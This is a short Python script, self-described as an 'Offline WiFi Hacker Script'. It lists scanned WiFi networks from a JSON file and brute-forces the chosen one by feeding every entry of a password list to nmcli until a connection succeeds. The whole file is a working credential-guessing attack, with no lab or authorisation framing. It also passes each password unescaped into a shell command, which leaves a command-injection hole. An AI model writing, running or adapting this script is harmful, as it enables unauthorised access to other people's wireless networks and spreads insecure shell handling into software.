#!/usr/bin/env python3
"""
Offline WiFi Hacker Script
Reads saved passwords and attempts to connect to the selected WiFi offline using BSSID.
"""

import os
import subprocess
import sys
import json

TMP_DIR = "tmp"


def load_wifi_data():
    """Load WiFi scan data from JSON file."""
    filepath = os.path.join(TMP_DIR, "wifi_list.json")
    if not os.path.exists(filepath):
        print(f"WiFi list file '{filepath}' not found.")
        sys.exit(1)

    with open(filepath, "r") as f:
        return json.load(f)


def display_networks(wifi_data):
    """Display available networks with indices."""
    print("Available networks:")
    for i, entry in enumerate(wifi_data, 1):
        ssid = entry["ssid"]
        bssid = entry["bssid"]
        signal = entry["signal"]
        active = " (active)" if entry["active"] == "yes" else ""
        hidden = " (hidden)" if ssid == "--" else ""
        print(f"{i}. {ssid} | BSSID: {bssid} | Signal: {signal}%{active}{hidden}")


def find_network(wifi_data, ssid_input):
    """Find network entry by SSID."""
    for entry in wifi_data:
        if entry["ssid"] == ssid_input:
            return entry
    return None


def attempt_connect(bssid, password):
    """
    Attempt to connect to WiFi using nmcli with BSSID.
    """
    cmd = f"nmcli device wifi connect {bssid} password '{password}'"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Success with password: {password}")
            return True
        else:
            print(f"Failed with password: {password}. Error: {result.stderr.strip()}")
            return False
    except Exception as e:
        print(f"Error attempting connect: {e}")
        return False


def main():
    wifi_data = load_wifi_data()
    display_networks(wifi_data)
    ssid_input = input("\nEnter the SSID (or index number for selection): ").strip()

    # If input is a number, select by index
    try:
        index = int(ssid_input) - 1
        if 0 <= index < len(wifi_data):
            selected = wifi_data[index]
            ssid = selected["ssid"]
        else:
            ssid = ssid_input
    except ValueError:
        ssid = ssid_input

    entry = find_network(wifi_data, ssid)
    if not entry:
        print("Network not found.")
        sys.exit(1)

    bssid = entry["bssid"]
    print(f"Attempting to connect to '{ssid}' (BSSID: {bssid})...")

    # For hidden networks, prompt for actual SSID if needed
    if ssid == "--":
        actual_ssid = input("Enter the actual SSID for this hidden network: ").strip()
        if actual_ssid:
            ssid = actual_ssid
        else:
            ssid = "HiddenNetwork"  # Default for filename

    # Construct filename: replace spaces with _, add _passwords.txt
    filename = (
        ssid.replace(" ", "_").replace("--", "Hidden") + "_passwords.txt"
    )  # Handle hidden
    filepath = os.path.join(TMP_DIR, filename)

    if not os.path.exists(filepath):
        print(f"Password file '{filename}' not found in {TMP_DIR}.")
        sys.exit(1)

    with open(filepath, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    if not passwords:
        print("No passwords found in file.")
        sys.exit(1)

    for pwd in passwords:
        if attempt_connect(bssid, pwd):
            break
    else:
        print("All passwords failed.")


if __name__ == "__main__":
    main()
